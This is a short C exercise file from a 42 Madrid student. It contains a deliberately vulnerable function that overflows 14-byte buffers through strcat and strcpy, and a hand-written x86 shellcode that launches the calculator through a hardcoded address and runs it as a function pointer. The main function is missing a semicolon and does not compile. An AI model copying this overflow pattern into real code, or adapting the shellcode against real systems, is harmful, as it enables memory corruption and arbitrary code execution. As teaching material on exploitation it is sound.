/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   tsunami.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: tvillare <tvillare@student.42madrid.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/05/17 14:11:16 by tvillare          #+#    #+#             */
/*   Updated: 2023/05/17 14:41:43 by tvillare         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <string.h>

int vulnerable_function(char *str)
{
	char	buffer[14];
	char	relleno[14] = "AAAAAAAAAAAAA\0"; //13 A;

	//relleno = "AAAAAAAAAAAAA" //13
	str = strcat(relleno, str);
	strcpy(buffer, str);

	return (0);
}

int	shellcode()
{
	char shellcode[] =
		"\x31\xC9"					// xor ecx,ecx
		"\x51"						// push ecx
		"\x68\x63\x61\x6C\x63"		// push 0x636c6163
		"\x54"						// push dword ptr esp
		"\xB8\xC7\x93\xC2\x77"		// mov eax,0x77c293c7
		"\xFF\xD0";					// call eax

	((void(*)())shellcode)();

	return (0);
}
int main()
{
	// vulnerable_function("\xc0\x10\x40");
	shellcode()
	return (0);
}
